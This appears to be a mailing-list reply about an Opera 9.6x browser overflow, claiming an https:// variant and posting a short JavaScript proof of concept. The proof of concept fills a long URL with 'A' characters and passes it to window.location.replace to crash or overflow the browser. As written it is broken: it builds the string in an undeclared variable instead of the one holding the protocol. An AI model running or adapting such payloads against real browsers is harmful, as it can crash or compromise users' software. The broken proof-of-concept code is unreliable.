Subject: Re: Opera 9.6x file:// overflow


hi

is very curious vulnerability...

I think I found a variant of this vulnerability, if using another protocol (eg: https ://).

I am sure that is an variant because providing other protocolos (eg: http://) does not work, nor the exceptions that are generated are equal to fail.


------------------ POC ---------------------
<script>

var evil = "https://";

for(var i = 0; i<14000; i++)

code += "A";

window.location.replace(code);
